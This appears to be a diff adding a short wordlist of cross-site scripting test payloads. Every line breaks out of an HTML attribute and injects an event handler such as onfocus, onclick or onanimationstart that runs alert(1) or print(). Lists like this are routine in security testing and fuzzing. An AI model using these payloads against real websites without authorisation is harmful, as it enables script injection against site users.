@@ -1,0 +1,13 @@
+" autofocus onfocus=alert(1) x="
+" accesskey=x onclick=alert(1) x="
+" onclick=alert(1) x="
+' onclick=alert(1) '
+" onmouseover=print() x="
+" onpointerenter=alert(1) x="
+" onkeydown=alert(1) tabindex=1 x="
+" style=animation-name:spin onanimationstart=alert(1) x="
+&apos;-alert(1)-&apos;
+" accesskey=x onclick=alert(1) x="
+" onclick="alert(1)//
+" onclick="alert(1)/*x*/
+
